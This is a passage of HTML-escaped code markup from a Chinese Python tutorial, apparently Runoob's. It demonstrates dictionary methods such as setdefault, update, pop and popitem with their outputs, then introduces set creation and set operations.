&lt;span class=&#34;token comment&#34;&gt;# 检测键 Age 是否存在&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Age&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;键 Age 不存在&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;键 Age 存在&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 键 Age 存在&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Age&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Value : %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;items&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Value : dict_items([(&#39;Name&#39;, &#39;Runoob&#39;), (&#39;Age&#39;, 7)])&lt;/span&gt;

dishes &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;eggs&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;sausage&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;bacon&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;spam&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;500&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
keys &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; dishes&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;keys&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
values &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; dishes&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;values&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 迭代&lt;/span&gt;
n &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; val &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; values&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    n &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; val
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 504&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# keys 和 values 以相同顺序（插入顺序）进行迭代&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;keys&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;     &lt;span class=&#34;token comment&#34;&gt;# 使用 list() 转换为列表&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [&#39;eggs&#39;, &#39;sausage&#39;, &#39;bacon&#39;, &#39;spam&#39;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;values&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [2, 1, 1, 500]&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 视图对象是动态的，受字典变化的影响，以下删除了字典的 key，视图对象转为列表后也跟着变化&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;del&lt;/span&gt; dishes&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;eggs&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;del&lt;/span&gt; dishes&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;sausage&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;keys&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [&#39;bacon&#39;, &#39;spam&#39;]&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Age&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Age 键的值为 : %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;setdefault&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Age&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Age 键的值为 : 7&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Sex 键的值为 : %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;setdefault&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Sex&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Sex 键的值为 : None&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;新字典为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 新字典为： {&#39;Name&#39;: &#39;Runoob&#39;, &#39;Age&#39;: 7, &#39;Sex&#39;: None}&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Age&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
dict2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Sex&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;female&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;update&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dict2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;更新字典 dict : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 更新字典 dict :  {&#39;Name&#39;: &#39;Runoob&#39;, &#39;Age&#39;: 7, &#39;Sex&#39;: &#39;female&#39;}&lt;/span&gt;


site&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;菜鸟教程&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;alexa&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;url&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;www.runoob.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
pop_obj&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;site&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;pop_obj&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 菜鸟教程&lt;/span&gt;


site&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;菜鸟教程&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;alexa&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;url&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;www.runoob.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
pop_obj&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;site&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;popitem&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;pop_obj&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# (&#39;url&#39;, &#39;www.runoob.com&#39;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;site&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;name&#39;: &#39;菜鸟教程&#39;, &#39;alexa&#39;: 10000}&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
字典长度 : 2
字典删除后长度 : 0
新复制的字典为 :  {&#39;Name&#39;: &#39;Runoob&#39;, &#39;Age&#39;: 7, &#39;Class&#39;: &#39;First&#39;}
新的字典为 : {&#39;name&#39;: None, &#39;age&#39;: None, &#39;sex&#39;: None}
新的字典为 : {&#39;name&#39;: 10, &#39;age&#39;: 10, &#39;sex&#39;: 10}
Age 值为 : 27
Sex 值为 : NA
键 Age 存在
键 Sex 不存在
键 Age 存在
Value : dict_items([(&#39;Name&#39;, &#39;Runoob&#39;), (&#39;Age&#39;, 7)])
504
[&#39;eggs&#39;, &#39;sausage&#39;, &#39;bacon&#39;, &#39;spam&#39;]
[2, 1, 1, 500]
[&#39;bacon&#39;, &#39;spam&#39;]
Age 键的值为 : 7
Sex 键的值为 : None
新字典为： {&#39;Name&#39;: &#39;Runoob&#39;, &#39;Age&#39;: 7, &#39;Sex&#39;: None}
更新字典 dict :  {&#39;Name&#39;: &#39;Runoob&#39;, &#39;Age&#39;: 7, &#39;Sex&#39;: &#39;female&#39;}
菜鸟教程
(&#39;url&#39;, &#39;www.runoob.com&#39;)
{&#39;name&#39;: &#39;菜鸟教程&#39;, &#39;alexa&#39;: 10000}
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;集合&#34;&gt;&lt;a href=&#34;#集合&#34; class=&#34;headerlink&#34; title=&#34;集合&#34;&gt;&lt;/a&gt;集合&lt;/h2&gt;&lt;p&gt;创建格式&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;parame &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;value1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; value2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; ……&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;value&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 创建一个空集合&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;sites &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;123&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sites&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出集合，重复的元素被自动去掉&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {1, &#39;123&#39;, &#39;test&#39;}&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 成员测试&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; sites&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test 在集合中&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test 不在集合中&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# set可以进行集合运算&lt;/span&gt;
a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;abracadabra&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;alacazam&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# a 和 b 的差集&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# a 和 b 的并集&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# a 和 b 的交集&lt;/span&gt;
